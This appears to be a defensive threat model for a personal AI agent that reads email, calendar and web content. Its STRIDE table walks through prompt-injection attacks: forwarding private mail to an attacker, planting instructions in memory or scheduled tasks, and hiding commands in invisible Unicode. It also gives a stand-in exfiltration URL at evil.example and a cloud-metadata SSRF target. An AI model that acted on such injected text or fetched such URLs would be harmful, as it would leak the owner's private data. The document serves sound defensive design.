# Bastion Threat Model

Version 0.1, written before the first line of agent code so that the design follows from it.

## 1. What Bastion is

A personal agent that runs continuously on the owner's machine (or a small server they control).
The owner talks to it over Telegram and a local CLI. It can read and draft email (Gmail), read and
manage calendar events (Google Calendar), search and read the web, remember facts, and run
scheduled tasks without the owner present.

## 2. Core assumption

> **The language model is not a security boundary.**

Any text the model reads can steer it: an email, a web page, a calendar invite, a search snippet,
even a stored memory. No current model reliably resists prompt injection. Bastion therefore treats
the model as an **untrusted planner**: it may *propose* actions, but deterministic code outside
the model decides whether each action is allowed, needs approval, or is refused.

## 3. Assets

| Asset | Why it matters |
|---|---|
| Email contents and contacts | Private, and a lever for fraud and phishing |
| Calendar data | Reveals location, routine, associates |
| Ability to send email as the owner | Impersonation, fraud, reputational harm |
| OAuth refresh tokens, LLM API keys, Telegram bot token | Long-lived account access, billing abuse |
| Agent memory | Personal facts; also a persistence vector for injected instructions |
| Audit log | The owner's only reliable record of what the agent did |
| Host machine and local network | Pivot target via SSRF |

## 4. Adversaries

| Adversary | Capability |
|---|---|
| **A1. Content attacker** (most likely) | Can put text in front of the agent: sends the owner an email, a calendar invite, or controls a web page the agent reads. Cannot talk to the agent directly. |
| **A2. Stranger on Telegram** | Finds the bot's username and messages it. |
| **A3. Telegram account hijacker** | Controls the owner's Telegram session (SIM swap, stolen device, session theft). |
| **A4. Malicious or compromised dependency** | Code running inside the Bastion process via a poisoned package. |
| **A5. Local attacker / malware** | Read access to the owner's user files. |
| **A6. Compromised LLM provider** | Sees prompts; can return arbitrary responses. |

## 5. Trust boundaries

```
 [Owner] ──Telegram/CLI──► (B1) ──► Bastion core ──► (B3) ──► LLM provider API
                                       │   ▲
                                       │   └── (B2) untrusted content: email bodies, web pages,
                                       │            calendar invites from others, search results
                                       ▼
                             (B4) tool execution ──► Gmail / Calendar / Web
                                       │
                             (B5) local state: SQLite, audit log, OS keyring
```

- **B1** Owner input. Trusted *only* after channel authentication (Telegram user-ID allowlist, local CLI user).
- **B2** Untrusted content. Never trusted, regardless of how it arrived.
- **B3** LLM. Output is untrusted: a proposal, not a command.
- **B4** Side effects. Every crossing passes the policy engine.
- **B5** Local state. Secrets live only in the OS keyring; other sensitive fields are encrypted.

## 6. The lethal trifecta

An agent is exploitable for data theft when it combines **(1) access to private data**, **(2)
exposure to untrusted content**, and **(3) a channel to send data out**. Bastion has all three by
design: that is what a useful personal agent is. It cannot remove any leg entirely, so it
**breaks the chain at runtime**: once untrusted content has entered a turn (taint), every
outbound channel (send email, fetch a URL the model composed, create an invite with external
attendees) is either blocked or requires the owner's explicit, argument-bound approval.

## 7. Threats and controls (STRIDE)

| ID | Threat | STRIDE | Adversary | Controls |
|---|---|---|---|---|
| T1 | Injected email makes the agent forward private mail to the attacker | Info disclosure | A1 | Everything read from Gmail is untrusted and taints the conversation (C2); sending is a `send` action, offered only if the owner opted in, and once tainted it needs approval of the exact recipients and text (C1, C4, C9); by default the planner sees a quarantined reader's digest, not the email (C3); links in email never become fetchable (C7) |
| T2 | Injected web page makes the agent fetch `https://evil.example/?d=<secrets>` | Info disclosure | A1 | URL-provenance rule: `web_fetch` only accepts URLs seen in search results or owner messages (C7) |
| T3 | Agent tricked into fetching `http://169.254.169.254/` or LAN admin pages | Info disclosure / EoP | A1 | SSRF guard: resolve, reject private/loopback/link-local/reserved ranges, pin IP, re-check redirects (C7) |
| T4 | Injected text makes the agent delete mail or calendar events | Tampering | A1 | `destructive` tier: refused in a tainted conversation, otherwise approval plus TOTP step-up (C1, C4, C5); a deletion names the event, which code checks against the live event (C4); Bastion offers no way to delete email |
| T5 | Owner approves "send to alice@" but the agent sends to someone else | Tampering | A1 | Approval bound to a hash of the exact tool arguments; single use; expiring (C4) |
| T6 | Stranger commands the bot | Spoofing / EoP | A2 | Pairing needs a one-time code from the terminal *and* the owner's confirmation there, with a guess limit per sender; the owner (user and private chat) is kept in the OS keyring; every other user, group or chat is dropped without a reply and audited with a rate limit (C6) |
| T7 | Hijacked Telegram approves high-risk actions | Spoofing | A3 | TOTP step-up for every send action (email, invitations, notifying guests) and every destructive action, enforced in code whatever the policy file says, each code usable once; five wrong codes in an hour engage the kill switch (C5); `/stop` kill switch that only the computer can release (`bastion resume`); `bastion telegram unpair` stops a running bot at its next update (C6, C11) |
| T8 | Injected instruction stored in memory and replayed in every future session | Tampering (persistence) | A1 | Memory provenance bound into the ciphertext; tainted memories come back as untrusted data; caps on untrusted memories; trusted memories always rank first (C12) |
| T9 | Secrets leak into logs, audit entries, or model context | Info disclosure | A1, A5 | Keyring-only storage (C8); redaction filter on all log and audit output (C8); tools never return credentials |
| T10 | Token theft from disk | Info disclosure | A5 | OS keyring (C8); AES-GCM field encryption for sensitive DB fields (C13) |
| T11 | Over-broad Google access amplifies any compromise | EoP | All | The owner's own OAuth client; an access level per service, each asking for the fewest scopes; the level used is the lower of what was requested and what was granted; sending mail is opt-in; no email deletion, settings or contacts access (C9) |
| T12 | Owner cannot tell what the agent did, or evidence is edited | Repudiation | A1, A5 | HMAC-chained audit log in SQLite, append-only triggers, `bastion audit verify` (C10) |
| T13 | Scheduled task loops, burns money, or drifts beyond its purpose | DoS / EoP | A1 | Each task is granted a fixed set of tools and the model sees no others; per-run step, tool-call and token budgets plus a per-task 24-hour token budget; at most hourly; three failed runs in a row pause it; runs missed while offline are skipped, not replayed; no task starts while `/stop` is engaged, and `/cancel` or `/stop` ends a running one (C11) |
| T14 | Poisoned dependency, or a tampered download | All | A4 | Hash-locked dependencies, minimal dependency tree, pip-audit, Dependabot (packages, actions and base images), CodeQL; actions pinned by commit and base images by digest; every release artefact and image has a CycloneDX SBOM and a Sigstore-signed build-provenance attestation the owner can verify (C14) |
| T15 | Malicious tool-call arguments (wrong types, path tricks, header injection) | Tampering | A1 | Every tool's arguments validated by a strict Pydantic schema before policy evaluation |
| T16 | Exposed network listener attacked | EoP | A2 | No inbound ports: Telegram long polling; the CLI runs in-process (no local IPC server). The one exception is the loopback listener during `bastion google connect` (T27) |
| T17 | Model output misleads the owner on screen: ANSI escapes rewrite the terminal, bidi or zero-width characters disguise an approval's recipient, link text hides the real URL | Spoofing | A1 | Replies shown with control characters stripped; approval prompts show them as visible `\uXXXX`; links rendered with their real URL (C16) |
| T18 | Data exfiltrated through the chat channel itself: Telegram's servers fetch any URL in a bot message to build a link preview | Info disclosure | A1 | Link previews disabled on every outgoing message; plain text only, never Telegram markup (C16) |
| T19 | Environment variables (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, proxy and certificate settings) or an HTTP redirect divert prompts and the API key | Info disclosure | A4, A5 | Base URLs always passed explicitly and required to be HTTPS (HTTP only for localhost); LLM and web clients ignore proxy/certificate environment variables; LLM clients never follow redirects (Anthropic's `x-api-key` header is not stripped on cross-origin redirects) (C7, C8) |
| T20 | Crafted HTML makes the parser burn CPU for minutes, freezing the agent and every timeout with it | DoS | A1 | CPython 3.13.6+ required (linear-time `html.parser`; earlier 3.13 releases are quadratic on malformed input); parse-size cap; parsing runs off the event loop; regression test (C7) |
| T21 | Attacker-controlled text reaches the model through an *error* message (an echoed `Content-Type` or redirect target), unfenced and without tainting | Tampering | A1 | Tool errors never echo remote data; failures after contacting an untrusted party taint the conversation and are fenced like output (C2) |
| T22 | Instructions hidden in invisible Unicode ("ASCII smuggling" with tag characters, zero-width or bidi characters): readable by the model, invisible to the owner | Tampering | A1 | Invisible characters are stripped from all untrusted tool output before the model sees it, and revealed as `\uXXXX` in approval prompts and the audit viewer (C16) |
| T23 | The owner forwards a message written by someone else ("summarise this"), carrying an injection into the trusted channel | Tampering | A1 | Forwarded and bot-generated messages are fenced as untrusted and taint the conversation; their links are not made fetchable; they never count as commands or authenticator codes (C2, C6, C7) |
| T24 | The bot token leaks (it sits in every Bot API URL) through request logs, error messages or a proxy, letting an attacker read or answer the owner's chat | Info disclosure / Spoofing | A4, A5 | Token only in the OS keyring and entered at a hidden prompt; HTTP request logging silenced; transport errors re-raised without their text or cause; proxy variables ignored; a second poller (409 Conflict) raises an alarm to revoke the token (C6, C8) |
| T25 | Requests queued while Bastion was offline run hours later, when the owner no longer expects them | Tampering | A3 | The update backlog is discarded at startup; the owner is told so (C6) |
| T26 | A hijacked account or a stuck client floods the bot, running up model costs | DoS | A2, A3 | One request at a time; a per-owner token bucket; strangers' audit entries capped per hour; `/stop` (C6, C11) |
| T27 | During `bastion google connect`, another program or a web page interferes with the sign-in: plants its own authorization code (login CSRF), steals the code, or attacks the listener | Spoofing / Info disclosure | A5, web attacker | The listener binds 127.0.0.1 only, on a random port, only while connecting; it accepts one valid redirect, gives up after five minutes, caps request size and read time, and serves a static page; `state` (256 random bits) is compared in constant time; PKCE (S256) makes a stolen code useless (C9) |
| T28 | An approval shows only an opaque id ("delete event abc123"), so the owner approves something other than they think | Tampering | A1 | Calendar changes and deletions name the event (its title and start); code checks them against the live event before acting and never echoes the live values; a whole recurring series is refused (only single occurrences change); the event's ETag (`If-Match`) makes Google refuse if it changed between that check and the write (C4) |
| T29 | A calendar invitation carries an injection, or Bastion writes injected text into an event that later comes back as the owner's (persistence) | Tampering | A1 | Invitations, events guests can edit or add people to, and events Google made from email are untrusted; events Bastion writes in a tainted conversation are marked and stay untrusted; changing an event that has other guests is a `send` action the model must declare (`notify_guests`), checked against the live event; only events the owner organises can be changed (C1, C2, C12) |
| T30 | Google access leaks or outlives its purpose: a stolen refresh token, an access token in a log, a disconnect that leaves a running daemon connected | Info disclosure | A4, A5 | Refresh token only in the OS keyring; access tokens only in memory and registered for redaction; request logging silenced; transport errors raised without their cause; the keyring is re-checked before each use, so `bastion google disconnect` (which also revokes at Google) stops a running daemon; reconnecting revokes the previous token (C8, C9) |
| T32 | Injected text plants a scheduled task, so the attack recurs every day without the owner watching (persistence) | Tampering / EoP | A1 | `task_schedule` always asks the owner and always needs the authenticator code, whatever the policy file says; it is refused outright once the conversation contains untrusted content; tasks can never be granted the task tools, so a task cannot create, change or remove tasks (C1, C4, C5, C11) |
| T33 | A task runs while the owner is away and acts on what it reads: sends mail, invites people, deletes | EoP | A1 | Task mode in the policy engine: every send action needs approval (even if the policy file allows sends), destructive actions are refused once the run reads untrusted content, and the approval prompt names the task; each run starts with a fresh conversation, so taint and injected text do not carry over between runs (C1, C2, C11) |
| T34 | Someone with write access to the database widens a task's grant, rewrites its instructions, or plants a task | Tampering | A5 | A task's definition (name, schedule, instructions, tools) is one AES-GCM document bound to its id, with the key in the OS keyring: an edited, transplanted or planted definition fails to decrypt, the task never runs, and the owner is told; claiming a run is a compare-and-set, so a run is never started twice (C11, C13) |
| T31 | Crafted email (deep MIME nesting, huge bodies, odd charsets, forged threading headers) slows or crashes the agent, or smuggles headers into a reply | DoS / Tampering | A1 | Limits on MIME depth and part count, response size and text length; HTML converted off the event loop; unknown charsets fall back to UTF-8; Message-IDs copied into a reply only if well formed; recipients are bare ASCII addresses and subjects single lines (C7, T15) |
| T35 | On a server or in a container there is no OS keyring: secrets on disk are stolen with a backup or a copied volume | Info disclosure | A5 | The sealed file store: every secret is AES-GCM sealed under a master key kept outside Bastion's data folder (a Docker secret or a root-owned file; a key inside the folder is refused), with its name bound in as associated data so values cannot be swapped; a wrong key or an edited file fails closed (C8) |
| T36 | Code running inside the daemon (a dependency bug, a parser exploit) tries to gain more | EoP | A4 | The container runs as an unprivileged user with a read-only root filesystem, every capability dropped, `no-new-privileges`, a process limit and no published ports; the systemd unit applies the equivalent sandboxing (C14) |

## 8. Controls index

C1 policy engine (default-deny, risk tiers) · C2 taint tracking · C3 quarantined reader ·
C4 argument-bound approvals · C5 TOTP step-up · C6 Telegram lockdown · C7 egress guard ·
C8 secrets vault (OS keyring, or the sealed file store on servers) and redaction · C9 least-privilege OAuth · C10 tamper-evident audit log ·
C11 autonomy guardrails · C12 memory provenance · C13 encryption at rest · C14 supply chain ·
C15 red-team eval suite (verifies C1 to C13 against a corpus of attacks) ·
C16 display safety (terminal and channel rendering of untrusted text).

Where each control lives in the code: [ARCHITECTURE.md](ARCHITECTURE.md#security-controls-in-the-code).

## 9. Accepted risks and non-goals

- **A6, a malicious LLM provider,** sees everything in the prompt. Mitigation is provider choice
  (including fully local models through any OpenAI-compatible server). Bastion does not encrypt
  prompts from the provider.
- **A5 with code execution as the owner** can read the keyring and memory of the running process.
  Defending against a fully compromised user account is out of scope.
- **Information disclosed in replies to the owner** is by design: if the owner asks "summarise my
  inbox", the summary contains private data. The goal is that data only flows to the owner.
- **Approval fatigue.** If the owner approves everything without reading, approvals don't help.
  Bastion mitigates this by keeping approvals rare (read actions never prompt), showing exact
  diffs, and requiring TOTP only for actions that reach other people or cannot be undone.
- **URL-selection side channel.** A page or search result can list many links. A hijacked model
  cannot *construct* a URL, but by choosing *which* listed URL to fetch it could leak a few bits.
  Per-request tool-call budgets bound this; it is not eliminated. For the same reason, links found
  inside fetched pages are not made fetchable.
- **Search queries** are sent to the search provider, just as prompts are sent to the LLM
  provider. Neither is an attacker-observable channel, but both are third parties.
- **Audit log tail truncation.** The HMAC chain detects edited, forged, reordered or deleted
  entries, but cutting entries off the *end* leaves a shorter valid chain. The chain head is
  therefore checkpointed in the OS keyring at the end of every turn and session, so `verify`
  catches a truncated or wiped log back to the last checkpoint. Entries written after the last
  checkpoint are not covered, and an attacker who can rewrite the keyring (A5) can move the
  checkpoint too. The Telegram daemon therefore also sends the chain head to the owner at startup
  and daily, a copy off the machine: `bastion audit verify --checkpoint <entry>:<chain>` checks
  the log against it. This narrows the gap to entries written since the last message received.
- **Telegram sees the conversation.** Bot chats are not end-to-end encrypted, so Telegram's
  servers see what the owner and Bastion say, as the LLM provider does. Secrets are never sent
  (outgoing text passes the redactor), but private data the owner asks about is.
- **Step-up codes defend against A3, not A5.** The TOTP secret lives in the same OS keyring as
  everything else, so malware running as the owner could compute codes. It stops someone who
  holds only the owner's Telegram account.
- **Pending approvals do not survive a restart.** They live in the daemon's memory; restarting it
  abandons them, which counts as "no" (fail closed).
- **Approvals never hide anything, so some are refused.** A Telegram approval prompt shows the
  exact arguments. If they contain something that looks like a secret (an API key, token,
  password or private key), the action is refused rather than shown redacted, because a redacted
  prompt could hide what the approval really binds. An email that legitimately contains such text
  has to be sent another way.
- **Authenticator replay across a restart.** Codes are single-use while the daemon runs; a code
  captured in the last minute or so could be replayed if the daemon restarted in between. That
  needs local access to restart it (and local access already reaches the TOTP secret).
- **Audit records are summaries.** Tool arguments are logged as lengths and short hashes (plus
  safe fields such as a URL's host), so the log proves what ran without becoming a plaintext copy
  of private data. The trade-off: the log alone cannot show the full text of past arguments.
- **Hidden-text stripping is best effort.** The HTML extractor drops text hidden with common
  techniques, but pages can hide text in ways it does not detect. Fetched pages therefore stay
  untrusted regardless.
- **Google's drafting permission can also send.** Google has no drafts-only Gmail scope:
  `gmail.compose` also permits sending. At the default level (`draft`) the token could send mail
  if code running as the owner misused it (A4, A5); Bastion itself offers the model no way to
  send unless the owner connects with `--gmail send`.
- **The quarantined reader narrows the injection channel; it does not close it.** A summary of
  hostile text can still carry hostile text, so digests stay untrusted, and taint, policy and
  approvals remain the guarantee. The reader's tokens are not counted in the per-request budget
  (each call is capped instead).
- **Email and calendar content goes to the LLM provider**, like web pages and the owner's own
  messages (see A6).
- **Sign-ins in Google's "Testing" mode expire weekly.** External OAuth apps in testing get
  refresh tokens that last seven days; the "Personal" audience avoids this.
- **Sender domains are labels.** Taint sources such as `gmail:example.com` come from the `From`
  header, which senders can forge. They tell the owner where text came from; they are never
  treated as an identity.
- **"Owner-written" relies on Google's flags.** An event counts as the owner's own if Google
  says the owner organised and created it, it is an ordinary event, guests can neither edit it
  nor add people to it, and Bastion did not mark it. An event the owner typed up from someone
  else's text still counts as the owner's.
- **The sealed file store is only as private as its master key.** Whoever can read both the
  key and the data folder (root on the server, or code running as Bastion's user) can read
  every secret, as code running as the owner can read the OS keyring on a desktop. Keep the
  key out of backups of the data, and back it up separately: without it, the sealed secrets
  cannot be recovered.
- **Signed releases prove origin, not correctness.** An attestation shows an artefact was
  built by this repository's release workflow from a tagged commit; it says nothing about
  whether that commit is safe, and it relies on GitHub's identity infrastructure.
- **A hijacked Telegram account can read what Bastion can read.** Step-up codes guard actions
  (sending mail, deleting), not reading: someone holding the owner's Telegram session can ask
  for email and calendar contents. `/stop` and `bastion telegram unpair` end that access.
- **Search results are not quarantined.** `gmail_search` shows subjects, senders and snippets
  as written (untrusted and fenced, like web search results); only opening an email goes
  through the quarantined reader.
- **A scheduled task acts on the owner's earlier approval.** The owner approves a task's
  instructions and tools once; each run then reads, writes and asks within that grant without
  a fresh request. Sends and deletions still need approval at run time, and what a run reads
  leaves the machine only through the report to the owner and the model provider.
- **Task approvals can expire unanswered.** A task that needs approval while the owner is away
  waits for the normal approval timeout (10 minutes) and then counts it as "no".
- **Scheduling state is not sealed.** Someone who can write to the database (A5) cannot change
  what a task does or which tools it has, but can force an early run, reset its run history
  (and so its daily budget), or put back a removed task from an old copy of the database.
  Every run is still audited and reported to the owner.
- **Missed runs are skipped.** If Bastion is offline for over an hour past a run, that run does
  not happen; the owner is told when the daemon next checks.
- **The quarantined reader's tokens are not counted in a task's budget.** Reading an email
  costs a bounded extra model call that the per-run and daily token budgets do not see.
- **Shell and code execution and browser automation** are deliberately excluded from v1.

## 10. How this document is kept honest

Every control above has tests marked `@pytest.mark.security` that try to break it. The red-team
suite (C15: `bastion redteam`, `src/bastion/redteam/`) runs 24 attack scenarios end to end
against the real agent, policy, approvals and tools, with a model that obeys every injected
instruction; its results are in the README, and CI fails if any attack succeeds. Its mutation
tests switch each control off in turn and check that the attack aimed at it then succeeds, so
the suite is known to measure the controls rather than the sandbox. It found one gap while it
was built: a hijacked chat account (A3) could send calendar invitations, which email other
people in the owner's name, with a tap; every send action now needs the authenticator code.
The corpus is finite: passing it shows these attacks fail, not that every attack will.
A control without a failing-then-passing attack test is not considered implemented.
